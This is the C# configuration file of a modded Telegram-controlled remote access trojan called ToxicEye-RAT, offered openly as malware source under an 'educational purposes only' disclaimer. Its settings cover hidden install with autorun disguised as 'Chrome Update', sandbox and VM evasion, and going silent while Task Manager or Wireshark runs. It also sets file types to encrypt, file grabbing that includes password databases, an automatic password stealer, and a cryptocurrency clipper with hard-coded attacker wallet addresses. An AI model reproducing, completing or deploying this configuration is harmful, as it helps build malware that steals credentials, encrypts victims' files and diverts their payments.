/* 
       ^ Author    : LimerBoy && c0z3dc0
       ^ Name      : ToxicEye-RAT Modded
       ^ Github    : https://github.com/LimerBoy && https://github.com/c0z3dc0

       > This program is distributed for educational purposes only.
*/


namespace TelegramRAT
{
    internal sealed class config
    {
        // Telegram settings.
        public const string TelegramToken = "";
        public const string TelegramChatID = "";
        public static int TelegramCommandCheckDelay = 1;
        // Installation to system.
        public static bool AdminRightsRequired = true;
        public static bool AttributeHiddenEnabled = true;
        public static bool AttributeSystemEnabled = true;
        public static bool MeltFileAfterStart = false;
        public static string InstallPath = @"C:\Users\ToxicEye\rat.exe";
        // Add to startup.
        public static bool AutorunEnabled = true;
        public static string AutorunName = "Chrome Update";
        // Protect process with BSoD (if killed).
        public static bool ProcessBSODProtectionEnabled = false;
        // Hide console window. Need for debugging.
        public static bool HideConsoleWindow = false;
        // Do not start trojan if it running in VirtualBox, VMWare, SandBoxie, Debuggers.
        public static bool PreventStartOnVirtualMachine = false;
        // Start delay (in seconds).
        public static int StartDelay = 0;
        // The program will not make requests to telegram api if processes are running below.
        public static bool BlockNetworkActivityWhenProcessStarted = false;
        // Process list
        public static string[] BlockNetworkActivityProcessList =
        {
            "taskmgr", "processhacker",
            "netstat", "netmon", "tcpview", "wireshark",
            "filemon", "regmon", "cain"
        };
        // Types of files to be encrypted
        public static string[] EncryptionFileTypes =
        {
            ".lnk", 
            ".png", ".jpg", ".bmp", ".psd",
            ".pdf", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".csv", ".sql", ".mdb", ".sln", ".php", "py", ".asp", ".aspx", ".html", ".xml"
        };
        // Maximum file size to grab (in bytes). 5500000 - 5 MB | 10500000 - 10 MB | 21000000 - 20 MB | 63000000 - 60 MB
        public static long GrabFileSize = 6291456;
        // What types of files will be downloaded from the computer when executing the /GrabDesktop command.
        public static string[] GrabFileTypes =
        {
            ".kdbx",
            ".png", ".jpg", ".bmp",
            ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".sql", ".php", ".py", ".html", ".xml", ".json", ".csv"
        };
        // Automatically steal all passwords and send to chat at first start.
        public static bool AutoStealerEnabled = false;
        // Clipper is enabled
        public static bool ClipperEnabled = false;
        // Your wallet addresses
        public static string bitcoin_address = "1DJ5VetDBuQnmDZjRHRgEiCwYwvc6PSwu8";
        public static string etherium_address = "0x357C0541F19a7755AFbF1CCD824EE06059404238";
        public static string monero_address = "42Pwy6Xe4mPTz3mLap7AB5Jjd9NBt1MWjiqyvEFx3Fn8Fo9cRw9aJUHE1iTXEpUbQacMNiSxYejBKFE7UdGnyEncEECJey9";
    }
}
